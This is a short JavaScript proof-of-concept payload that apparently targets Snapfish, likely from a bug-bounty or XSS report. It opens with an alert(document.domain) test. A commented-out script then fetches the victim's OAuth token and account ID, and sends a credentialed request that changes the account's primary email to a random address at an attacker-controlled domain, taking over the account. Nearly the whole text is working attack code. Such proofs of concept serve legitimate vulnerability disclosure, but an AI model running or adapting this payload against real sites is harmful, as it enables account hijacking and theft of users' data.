alert(document.domain);
/*
url = "https://www.snapfish.com/library/getOauthInfo"
access_token = "text.oauthInfo.oa2";
account_id = "text.oauthInfo.oa2";
attacker_email = "attacker" + (Math.random() + 1).toString(36).substring(7) + "@khara.one";

function submitRequest()
{
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https:\/\/www.snapfish.com\/library\/request_api", true);
  xhr.setRequestHeader("accept", "*\/*");
  xhr.setRequestHeader("accept-language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
  xhr.setRequestHeader("content-type", "application\/json");
  xhr.setRequestHeader("Authorization", "OAuth "+ access_token );
  xhr.withCredentials = true;
  var body = "{\r\n" + 
    "\"data\":\"{\\\"core\\\":{\\\"primaryEmail\\\":\\\"" + attacker_email + "\\\"}}\",\"headers\":{\"content-type\":\"application/json\"},\"type\":\"PUT\",\"req_service\":\"accounts\",\"url\":\"/v1/account/"+account_id+"/globalInfo\"}\r\n" + 
    "\r\n";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
}

req = new XMLHttpRequest();
req.responseType = 'json';
req.open('GET', url, true);
req.onload = function () {
  var jsonResponse = req.response;
  access_token = jsonResponse.oauthInfo.oa2;
  account_id = jsonResponse.oauthInfo.accountId;
  submitRequest();
};
req.send(null);

setTimeout(() => { alert("Email( "+ account_id +" ) changed to "+ attacker_email );}, 5000);
*/
